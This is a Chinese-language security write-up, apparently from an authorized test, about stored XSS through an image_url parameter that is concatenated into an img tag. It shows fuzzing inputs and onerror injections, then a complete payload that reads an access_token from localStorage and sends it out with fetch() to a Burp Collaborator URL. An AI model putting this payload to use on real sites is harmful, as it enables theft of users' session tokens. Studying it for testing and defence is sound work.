## **前言**

在最近的一篇文章中，我们探讨了如何从PDF文件中提取数据以最大化利用跨站脚本（XSS）漏洞。通常情况下，利用XSS漏洞的主要目的是获取管理员的Cookie信息。然而，在某些场景下，后台凭证可能不仅存储在Cookie中，也可能存在于客户端本地存储中。例如，在一次授权测试中，我们发现某个应用直接将用户名和密码的明文信息保存在了本地。

## **触发XSS漏洞**

本次案例涉及一个文件上传功能，该功能允许用户将文件上传至云存储，并返回一个URL链接给服务器。服务器通过`image_url`参数接收这个URL链接，并将其嵌入到`<img>`标签中。具体来说，返回的`<img>`标签与字符串"s1600"相连。

我们的首要目标是触发存储型XSS漏洞，这是后续操作的基础。为此，我们尝试向`image_url`参数传递非URL值，观察其被拼接到`<img>`标签中的情况。结果表明，不仅输入的字符串被成功拼接到了`<img>`标签内，还额外出现了空格。

接着，我们对`image_url`参数进行了模糊测试：

1. 当`image_url="xxx test"`时，HTML返回为：`<img src="xxx test s1600">`
2. 当`image_url="xxx onerror=test"`时，HTML返回为：`<img src="xxx onerror=test s1600">`
3. 当`image_url="xxx onerror=alert(document.cookie);"`时，HTML返回为：`<img src="xxx onerror=alert(document.cookie); s1600">`

最后一次尝试成功弹出了包含Cookie信息的警告框，这标志着我们已经接近成功。

## **读取本地存储信息**

本地存储是一种Web Storage API，用于在浏览器中持久化存储键/值对。每个域都有独立的存储空间，即使关闭浏览器后数据依然保留。可以通过`Window.localStorage`对象访问这些数据。

通过对Burp Suite抓包分析得知，该应用程序除了使用基于Cookie的身份验证外，还采用了Bearer Token。Token的原始值以JSON格式存储于本地存储中。接下来我们将介绍如何利用XSS漏洞获取本地存储中的Token值。

- 读取特定键值：`localStorage.getItem('Key')`
- 解析JSON值：`JSON.parse(localStorage.getItem('Key')).KEYNAME`

构造Payload步骤如下：

1. 从本地存储中检索`access_token`：
   ```javascript
   token = JSON.parse(localStorage.getItem('KEYNAME')).access_token;
   ```

2. 将Token发送至Burp Collaborator进行带外传输：
   ```javascript
   url = 'https://g0h5el9lym4iht5u2co4ovymud03os.burpcollaborator.net/' + token;
   fetch(url);
   ```

3. 最终Payload：
   ```html
   <img src="xxx onerror=token=JSON.parse(localStorage.getItem('KEYNAME')).access_token;url='https://g0h5el9lym4iht5u2co4ovymud03os.burpcollaborator.net/'+token,fetch(url);">
   ```

通过上述Payload，可以在HTML中成功执行并触发带外请求，在Burp Suite中捕获到相应的Token值。